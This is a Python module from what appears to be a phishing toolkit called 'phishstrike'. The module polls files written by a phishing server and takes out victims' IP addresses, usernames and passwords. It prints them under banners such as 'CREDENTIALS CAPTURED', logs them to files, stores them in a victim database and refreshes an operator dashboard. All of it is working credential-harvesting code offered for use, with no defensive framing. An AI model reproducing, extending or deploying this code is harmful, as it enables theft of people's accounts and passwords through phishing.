import os
import time

import database
from lib.dashboard_client import notify_dashboard_refresh
from lib.terminal_ui import *
from phishstrike import state


def capture_ip(silent: bool = False) -> None:
    ip_file = os.path.join(state.BASE_DIR, ".server/www/ip.txt")
    if not os.path.exists(ip_file):
        return

    with open(ip_file, "r") as f:
        lines = f.readlines()
    ip = ""
    for line in lines:
        if "IP: " in line:
            ip = line.split("IP: ")[1].strip()

    if not silent:
        slow_type(
            "\n    [+] CONNECTION: VICTIM IP TRACKED !!",
            speed=0.01,
            start_rgb=RGB_PURPLE,
            end_rgb=RGB_CYAN,
        )
        print(
            f"    {DARK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        print(f"    {LIGHT2}Victim IP : {WHITE}{ip}")
        print(f"    {LIGHT2}Log File  : {LIGHT1}auth/ip.txt")
        print(
            f"    {DARK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )

    auth_dir = os.path.join(state.BASE_DIR, "auth")
    os.makedirs(auth_dir, exist_ok=True)
    auth_ip_file = os.path.join(auth_dir, "ip.txt")
    with open(auth_ip_file, "a") as f:
        f.writelines(lines)

    print("\r\033[K", end="")
    print(
        f"\n    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_PURPLE, RGB_CYAN)}"
    )
    slow_type(
        f"    [+] INFILTRATION DETECTED: {ip}",
        speed=0.01,
        start_rgb=RGB_WHITE,
        end_rgb=RGB_PURPLE,
    )
    print(
        f"    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_CYAN, RGB_PURPLE)}"
    )

    if silent:
        print(
            f"\n    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD}",
            end="",
            flush=True,
        )

    database.add_victim(state.website, "IP_ONLY", "N/A", ip)
    notify_dashboard_refresh()


def capture_creds(silent: bool = False) -> None:
    user_file = os.path.join(state.BASE_DIR, ".server/www/usernames.txt")
    if not os.path.exists(user_file):
        return

    with open(user_file, "r") as f:
        lines = f.readlines()
    account = ""
    password = ""
    for line in lines:
        if "Username:" in line:
            raw = line.split("Username:")[1].strip()
            if "Pass:" in raw:
                raw = raw.split("Pass:")[0].strip()
            account = raw
        if "Pass:" in line:
            password = line.split("Pass:")[-1].strip()

    ip = "Unknown"
    auth_ip_file = os.path.join(state.BASE_DIR, "auth/ip.txt")
    if os.path.exists(auth_ip_file):
        with open(auth_ip_file, "r") as f:
            last_lines = f.readlines()[-5:]
            for line in last_lines:
                if "IP: " in line:
                    ip = line.split("IP: ")[1].strip()

    if not silent:
        slow_type(
            "\n    [!] SUCCESS: CREDENTIALS CAPTURED !!",
            speed=0.02,
            start_rgb=RGB_PINK,
            end_rgb=RGB_CYAN,
        )
        print(
            f"    {DARK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        print(f"    {LIGHT2}Account  : {WHITE}{account}")
        print(f"    {LIGHT2}Password : {WHITE}{password}")
        print(f"    {LIGHT2}IP Addr  : {WHITE}{ip}")
        print(
            f"    {DARK}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )

    auth_dir = os.path.join(state.BASE_DIR, "auth")
    os.makedirs(auth_dir, exist_ok=True)
    auth_creds_file = os.path.join(auth_dir, "usernames.dat")
    with open(auth_creds_file, "a") as f:
        f.writelines(lines)

    print("\r\033[K", end="")
    print(
        f"\n    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_PINK, RGB_CYAN)}"
    )
    slow_type(
        f"    [!] INTEL SECURED: {account} | {password}",
        speed=0.01,
        start_rgb=RGB_WHITE,
        end_rgb=RGB_PINK,
    )
    print(
        f"    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_CYAN, RGB_PINK)}"
    )

    if silent:
        print(
            f"\n    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD}",
            end="",
            flush=True,
        )

    database.add_victim(state.website, account, password, ip)
    notify_dashboard_refresh()


def capture_data(silent: bool = False) -> None:
    state.stop_monitoring.clear()
    ip_file = os.path.join(state.BASE_DIR, ".server/www/ip.txt")
    user_file = os.path.join(state.BASE_DIR, ".server/www/usernames.txt")

    if not silent:
        wait_msg = "    [*] Waiting for Login Info... [ Ctrl + C to exit ]"
        print("\n" + gradient_text(wait_msg, RGB_BLUE, RGB_WHITE))
    try:
        while not state.stop_monitoring.is_set():
            if os.path.exists(ip_file):
                with open(ip_file, "r") as f:
                    content = f.read()
                    current_ip = ""
                    if "IP: " in content:
                        current_ip = content.split("IP: ")[1].split("\n")[0].strip()

                if current_ip != state.last_captured_ip:
                    capture_ip(silent=silent)
                    state.last_captured_ip = current_ip

                if os.path.exists(ip_file):
                    os.remove(ip_file)

            if state.stop_monitoring.is_set():
                break
            time.sleep(0.5)

            if os.path.exists(user_file):
                if not silent:
                    print(f"\n\n{DARK}[{WHITE}-{DARK}]{PURPLE} Login info Found !!")
                capture_creds(silent=silent)
                if os.path.exists(user_file):
                    os.remove(user_file)

            if state.stop_monitoring.is_set():
                break
            time.sleep(0.5)
    except KeyboardInterrupt:
        print(f"\n\n    {DARK}[{WHITE}-{DARK}]{LIGHT1} Stopping monitoring...")
        time.sleep(1)
